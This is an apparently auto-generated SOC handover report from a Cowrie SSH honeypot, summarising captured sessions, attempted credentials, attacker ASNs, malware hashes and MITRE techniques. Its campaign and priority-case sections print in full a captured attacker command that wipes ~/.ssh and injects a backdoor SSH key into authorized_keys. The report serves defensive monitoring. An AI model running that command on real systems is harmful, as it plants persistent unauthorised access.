# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-22 |
| **Generated At** | 2026-03-22T14:26:35Z |
| **Shift Time** | 14:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **29** |
| Confirmed Threats | **25** |
| False Positives Filtered | **4** (13.8%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **13** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **26** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **16** |
| Unique Credential Pairs | **16** |
| Unique Usernames | **13** |
| Unique Passwords | **15** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 3 |
| `admin` | 2 |
| `12` | 1 |
| `lan` | 1 |
| `odroid` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `password` | 2 |
| `12` | 1 |
| `ubuntu` | 1 |
| `admin2008` | 1 |
| `Lan123!` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `12` | `12` | 1 |
| `root` | `ubuntu` | 1 |
| `admin` | `admin2008` | 1 |
| `lan` | `Lan123!` | 1 |
| `odroid` | `odroid` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ubuntu` | `4.4.66.84` | 2026-03-22T13:14:55 |
| `root` | `Aa000000` | `118.122.147.49` | 2026-03-22T13:59:22 |
| `root` | `3245gs5662d34` | `118.122.147.49` | 2026-03-22T13:59:27 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.122.147.49`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **19** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS17621` | China Unicom Shanghai network | 1 | MEDIUM |
| `AS38283` | CHINANET SiChuan Telecom Internet Data Center | 1 | HIGH |
| `AS328539` | Giga for Telecommunication and Technology Limited | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS55330` | AFGHANTELECOM GOVERNMENT COMMUNICATION NETWORK | 1 | HIGH |
| `AS6128` | Cablevision Systems Corp. | 1 | HIGH |
| `AS46562` | Performive LLC | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (3)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-24495d3e443f

| Field | Detail |
|---|---|
| **Source IP** | `4.4.66[.]84` |
| **First Seen** | 2026-03-22 13:14 |
| **Last Seen** | 2026-03-22 13:16 |
| **Session Duration** | 79s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 13:14:54` | `cowrie.session.connect` |
| `2026-03-22 13:14:54` | `cowrie.client.version` |
| `2026-03-22 13:14:54` | `cowrie.client.kex` |
| `2026-03-22 13:14:55` | `cowrie.login.success` |
| `2026-03-22 13:16:13` | `cowrie.session.file_upload` |
| `2026-03-22 13:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.4.66[.]84` to AbuseIPDB if not already reported
- [ ] Block `4.4.66[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb3cc633aa72

| Field | Detail |
|---|---|
| **Source IP** | `118.122.147[.]49` |
| **First Seen** | 2026-03-22 13:59 |
| **Last Seen** | 2026-03-22 13:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 13:59:21` | `cowrie.session.connect` |
| `2026-03-22 13:59:21` | `cowrie.client.version` |
| `2026-03-22 13:59:22` | `cowrie.client.kex` |
| `2026-03-22 13:59:22` | `cowrie.login.success` |
| `2026-03-22 13:59:23` | `cowrie.session.params` |
| `2026-03-22 13:59:23` | `cowrie.command.input` |
| `2026-03-22 13:59:23` | `cowrie.command.failed` |
| `2026-03-22 13:59:23` | `cowrie.log.closed` |
| `2026-03-22 13:59:23` | `cowrie.session.params` |
| `2026-03-22 13:59:23` | `cowrie.command.input` |
| `2026-03-22 13:59:23` | `cowrie.session.file_download` |
| `2026-03-22 13:59:23` | `cowrie.log.closed` |
| `2026-03-22 13:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.147[.]49` to AbuseIPDB if not already reported
- [ ] Block `118.122.147[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09cfb906c5e1

| Field | Detail |
|---|---|
| **Source IP** | `118.122.147[.]49` |
| **First Seen** | 2026-03-22 13:59 |
| **Last Seen** | 2026-03-22 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-22 13:59:26` | `cowrie.session.connect` |
| `2026-03-22 13:59:26` | `cowrie.client.version` |
| `2026-03-22 13:59:26` | `cowrie.client.kex` |
| `2026-03-22 13:59:27` | `cowrie.login.success` |
| `2026-03-22 13:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.147[.]49` to AbuseIPDB if not already reported
- [ ] Block `118.122.147[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.172.180[.]124` | **4** | 2026-03-22 12:51 | 2026-03-22 13:20 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.174.46[.]118` | **4** | 2026-03-22 14:04 | 2026-03-22 14:25 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.66[.]30` | 1 | 2026-03-22 13:25 | 2026-03-22 13:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `102.38.3[.]107` | 1 | 2026-03-22 13:45 | 2026-03-22 13:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.122.147[.]49` | 1 | 2026-03-22 13:59 | 2026-03-22 13:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `159.65.149[.]231` | 1 | 2026-03-22 14:20 | 2026-03-22 14:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.94.74[.]94` | 1 | 2026-03-22 12:46 | 2026-03-22 12:46 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.55.70[.]26` | 1 | 2026-03-22 13:57 | 2026-03-22 13:57 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.120.57[.]125` | 1 | 2026-03-22 14:04 | 2026-03-22 14:04 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `24.146.240[.]78` | 1 | 2026-03-22 14:20 | 2026-03-22 14:21 | 12s | 0 | `T1592` | 🟢 LOW |
| `54.226.98[.]246` | 1 | 2026-03-22 12:57 | 2026-03-22 12:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `65.20.135[.]235` | 1 | 2026-03-22 14:12 | 2026-03-22 14:12 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.219.10[.]57` | 1 | 2026-03-22 13:27 | 2026-03-22 13:27 | 30s | 0 | `T1592` | 🟢 LOW |
| `90.152.202[.]214` | 1 | 2026-03-22 14:01 | 2026-03-22 14:01 | 30s | 0 | `T1592` | 🟢 LOW |
| `90.160.139[.]163` | 1 | 2026-03-22 14:23 | 2026-03-22 14:25 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `93.241.232[.]14` | 1 | 2026-03-22 13:18 | 2026-03-22 13:18 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 7/100 | 🟢 LOW | **18/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `54.226.98[.]246` | US | Amazon Technologies Inc. | **100** ⚠️ | 6 |
| `2.55.70[.]26` | IL | Partner Communications Ltd. | **100** ⚠️ | 19 |
| `180.94.74[.]94` | AF | GCN/DCN Networks | **100** ⚠️ | 17 |
| `221.120.57[.]125` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 34 |
| `24.146.240[.]78` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 15 |
| `65.20.135[.]235` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 18 |
| `172.172.180[.]124` | US | Microsoft Limited | **100** ⚠️ | 10 |
| `159.65.149[.]231` | IN | DigitalOcean, LLC | **100** ⚠️ | 6 |
| `90.160.139[.]163` | ES | Orange Espagne SA | **100** ⚠️ | 50 |
| `93.241.232[.]14` | DE | Deutsche Telekom AG | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 21 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 13 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 29 cases |
| Tool 34  | Credential Extractor        | ✅ 16 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (13.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 3 priority case(s) shown individually · 16 recon entry/entries in table (2 group(s) consolidating 8 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-22T14:26:35Z_
